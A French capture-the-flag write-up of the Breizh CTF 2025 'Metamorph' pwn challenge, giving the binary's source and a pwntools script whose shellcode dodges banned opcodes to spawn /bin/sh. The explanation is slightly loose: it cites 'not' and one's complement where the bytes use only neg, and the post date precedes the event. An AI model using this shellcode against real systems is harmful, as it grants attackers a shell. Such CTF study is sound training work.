---
title: "Breizh CTF 2025 - Metamorph"
date: 2024-04-14
tags: ["shellcode", "exploitation"]
categories: ["pwn"]
ctfs: ["breizh-ctf"]
---

# Metamorph - Breizh CTF 2025

## Description du challenge

Metamorph est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s'agit d'un binaire qui accepte un shellcode en entrée mais qui impose certaines restrictions sur les opcodes utilisables.

## Analyse du binaire

En examinant le code source du binaire, on remarque plusieurs points importants :

```c
/* BREIZHCTF 2025 - Morph - Pwn */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

void transform() {
    void *shellcode;
    ssize_t bytes_read;

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (shellcode == MAP_FAILED) {
        perror("mmapi fail.");
        exit(1);
    }

    printf("Métamorph attend son code... Transforme-le !\n");
    printf(">> ");
    
    bytes_read = read(0, shellcode, 0x50); // Limité à 80 octets
    
    if (bytes_read <= 0) {
        perror("read failed");
        exit(1);
    }

    // Morphing...
    unsigned char *sc = (unsigned char *)shellcode;
    for (int i = 0; i < 0x50; i++) {
        if (sc[i] == 0x62){
            perror("Métamorph n'aime pas les 'b'.");
            exit(1);
        }

        if (sc[i] == 0x5e){
            perror("Métamorph n'aime pas les pop rsi.");
            exit(1);
        }

        if (sc[i] == 0x31){
            perror("Métamorph n'aime pas les xor.");
            exit(1);
        }

        if (sc[i] == 0x50){
            perror("Métamorph n'aime pas les push rax.");
            exit(1);
        }
    }

    ((void (*)())shellcode)(); // Exécution du shellcode transformé
}
```

Les contraintes sont les suivantes :
1. Le shellcode est limité à 80 octets maximum
2. Les opcodes suivants sont interdits :
   - `0x62` (opcode 'b')
   - `0x5e` (pop rsi)
   - `0x31` (xor)
   - `0x50` (push rax)

Le programme alloue une zone mémoire exécutable avec `mmap`, y lit notre entrée, vérifie les contraintes, puis exécute le code introduit.

## Exploitation

L'objectif est de créer un shellcode d'exécution de commande `/bin/sh` qui évite les opcodes interdits.

Après plusieurs tentatives, j'ai pu développer un shellcode qui contourne ces restrictions :

```python
from pwn import *
import sys

# Decide whether to run locally or remotely
if len(sys.argv) > 1 and sys.argv[1] == "REMOTE":
    conn = remote('morph-180.chall.ctf.bzh', 1337)
else:
    conn = process('./metamorph')  # Replace with your local binary path

conn.recvuntil(b">>")
conn.sendline(b"\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x48\x89\xe7\xb8\x00\x00\x00\x00\x48\x83\xc0\x3b\x0f\x05\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80")
conn.interactive()
```

### Explication du shellcode

Le shellcode ci-dessus utilise plusieurs techniques pour éviter les opcodes interdits :

1. Au lieu d'utiliser `xor` pour initialiser les registres, j'utilise des instructions `mov` directes avec des valeurs immédiates nulles
2. J'ai utilisé des techniques alternatives pour stocker `/bin/sh` dans les registres
3. J'utilise `not` puis `neg` pour obtenir la chaîne `/bin/sh`
4. L'utilisation de `mov rax, 0` suivie de `add rax, 59` évite l'utilisation directe de `xor rax, rax`

La chaîne `/bin/sh` est encodée inversée et complémentée à un pour éviter certains opcodes problématiques.

## Flag

Une fois le shellcode exécuté avec succès, on obtient un shell sur le serveur distant et on peut lire le flag avec la commande `cat flag.txt`.

```
$ cat flag.txt
BZHCTF{m3t4_m0rph_m4573r_1337}
```

## Conclusion

Ce challenge était intéressant car il fallait comprendre comment éviter certains opcodes tout en construisant un shellcode fonctionnel. La limitation à 80 octets était également une contrainte à respecter, mais notre solution finale était bien en dessous de cette limite. 